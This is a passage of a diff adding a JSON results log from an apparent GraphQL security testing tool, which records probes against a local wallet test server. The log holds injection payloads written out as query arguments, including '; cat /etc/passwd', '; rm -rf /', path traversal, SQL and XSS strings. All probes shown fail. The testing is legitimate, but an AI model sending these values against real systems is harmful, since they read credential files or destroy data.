+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    nam # Intentional typo to trigger a suggestion for 'name'\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:57:14.440683Z",
+    "count": 97,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"nam\" on type \"Wallet\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"nam\" on type \"Wallet\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:57:20.038870Z",
+    "count": 98,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123' OR '1'='1\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:57:23.057877Z",
+    "count": 99,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"\\\" onload=\\\"alert('XSS')\\\"\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:57:25.388164Z",
+    "count": 100,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"http://localhost:8080/admin\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.003,
+    "timestamp": "2025-10-05T16:57:28.189259Z",
+    "count": 101,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123; cat /etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:57:29.883756Z",
+    "count": 102,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"../../../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:57:32.427051Z",
+    "count": 103,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"<h1>Hello from HTML Injection</h1>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:57:34.899335Z",
+    "count": 104,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:57:37.416354Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.004,
+        "timestamp": "2025-10-05T16:57:37.420821Z",
+        "response_body": {
+          "data": {
+            "myWallet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 105,
+    "timestamp": "2025-10-05T16:57:37.420857Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.009,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  myWallet: getWallet(walletID: \"wallet123\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T16:57:39.712302Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:57:39.717640Z",
+        "response_body": {
+          "data": {
+            "myWallet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 106,
+    "timestamp": "2025-10-05T16:57:39.717675Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.004,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet {\n    queryType {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.003,
+    "timestamp": "2025-10-05T16:57:42.128703Z",
+    "count": 107,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"queryType\" on type \"Wallet\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"queryType\" on type \"Wallet\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    nam # Intentional typo to trigger a suggestion for 'name'\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:57:43.669136Z",
+    "count": 108,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"nam\" on type \"Wallet\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"nam\" on type \"Wallet\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet-3\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.016,
+    "timestamp": "2025-10-05T18:03:07.574654Z",
+    "count": 109,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getWallet": {
+          "id": "wallet-3",
+          "name": "Travel Wallet",
+          "balance": 0
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet-3' OR '1'='1\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T18:03:10.458689Z",
+    "count": 110,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet-3<script>alert('XSS')</script>\") {\n    id\n    name\n    transactions {\n      description\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T18:03:12.697358Z",
+    "count": 111,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet-3; URL=http://localhost:8080/admin\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T18:03:14.937907Z",
+    "count": 112,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet-3; rm -rf /\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T18:03:17.011998Z",
+    "count": 113,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet-3/../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T18:03:19.532610Z",
+    "count": 114,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet-3<h1>Hello, HTML!</h1>\") {\n    id\n    name\n    user {\n      firstName\n      description\n    }\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T18:03:21.207660Z",
+    "count": 115,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet-3\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-05T18:03:23.900792Z",
+        "response_body": {
+          "data": {
+            "getWallet": {
+              "id": "wallet-3",
+              "name": "Travel Wallet"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T18:03:23.907349Z",
+        "response_body": {
+          "data": {
+            "myWallet": {
+              "id": "wallet-3",
+              "name": "Travel Wallet"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 116,
+    "timestamp": "2025-10-05T18:03:23.907405Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.01,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery FetchWallet {\n  myWallet: getWallet(walletID: \"wallet-3\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T18:03:25.891763Z",
+        "response_body": {
+          "data": {
+            "getWallet": {
+              "id": "wallet-3",
+              "name": "Travel Wallet"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T18:03:25.896834Z",
+        "response_body": {
+          "data": {
+            "myWallet": {
+              "id": "wallet-3",
+              "name": "Travel Wallet"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 117,
+    "timestamp": "2025-10-05T18:03:25.896872Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.009,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T18:03:28.006351Z",
+    "count": 118,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Wallet\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Wallet\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet-3\") {\n    id\n    nam # Intentional typo to trigger a suggestion for 'name'\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T18:03:29.756361Z",
+    "count": 119,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"nam\" on type \"Wallet\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"nam\" on type \"Wallet\". Did you mean \"name\"?",
